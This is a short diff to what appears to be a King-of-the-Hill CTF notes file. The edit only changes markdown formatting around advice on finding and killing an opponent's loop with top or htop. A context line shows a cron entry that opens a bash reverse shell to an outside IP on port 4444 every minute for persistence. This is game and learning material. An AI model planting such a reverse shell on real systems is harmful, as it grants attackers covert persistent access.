@@ -42,7 +42,7 @@ and below command can be used to get persistence on the system but run it after 
 `* * * * * /bin/bash -c "/bin/bash -i >& /dev/tcp/[IP_ADDR]/4444 0>&1"`
 
 So this one trick is to check, what loop is running if it is not yours then how you can find that loop and kill it
-`<i><b>so for this you can check proccesses running on top in "top" command the running proccesses will be there with their PIDs</b></i>`
+<i><b>so for this you can check proccesses running on top in "top" command the running proccesses will be there with their PIDs</b></i>
 
 <i><b>there is another version of htop is also available in our machines that is "htop" but "htop" may not be available on koth machines</b></i>
 
